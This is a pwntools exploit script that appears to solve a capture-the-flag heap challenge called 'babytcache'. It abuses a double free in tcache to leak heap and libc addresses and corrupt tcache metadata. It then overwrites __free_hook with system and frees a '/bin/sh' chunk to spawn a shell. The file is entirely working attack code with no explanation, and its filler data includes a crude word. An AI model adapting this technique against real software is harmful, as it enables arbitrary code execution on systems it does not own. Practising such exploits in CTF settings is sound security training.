from pwn import *

io = process('./babytcache', env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('./libc.so.6')
elf = ELF('./babytcache')

def add(index, size, data):
    print(io.recvuntil(b'>> '))
    io.sendline(b'1')
    print(io.recvuntil(b'Note index:\n'))
    io.sendline(str(index))
    print(io.recvuntil(b'Note size:\n'))
    io.sendline(str(size))
    print(io.recvuntil(b'Note data:\n'))
    io.sendline(data)

def edit(index, data):
    print(io.recvuntil(b'>> '))
    io.sendline(b'2')
    print(io.recvuntil(b'Note index:\n'))
    io.sendline(str(index))
    print(io.recvuntil(b'Please update the data:\n'))
    io.send(data)

def delete(index):
    print(io.recvuntil(b'>> '))
    io.sendline(b'3')
    print(io.recvuntil(b'Note index:\n'))
    io.sendline(str(index))

def view(index):
    print(io.recvuntil(b'>> '))
    io.sendline(b'4')
    print(io.recvuntil(b'Note index:\n'))
    io.sendline(str(index))


#
add(0, 512, b'COCK')
delete(0)
delete(0)
view(0)
print(io.recvuntil(b'Your Note :'))
heapbase = u64(io.recv(6)+b'\0\0') - 0x260
print('HEAP BASE: ', hex(heapbase))
edit(0, p64(heapbase+0x28))
add(1, 512, b'COCK')
add(2, 512, p64(0x0700000000000000))
add(3, 20, b'/bin/sh\0')
delete(0)
view(0)
print(io.recvuntil(b'Your Note :'))
libc.address = u64(io.recv(6)+b'\0\0') - 0x3ebca0 #- 0x3ebc40
print('LIBC BASE: ', hex(libc.address))
edit(2, p64(0x0300000000000000))
delete(0)
edit(0, p64(libc.sym['__free_hook']))
add(4, 512, b'OK')
add(5, 512, p64(libc.sym['system']))
delete(3)
io.interactive()
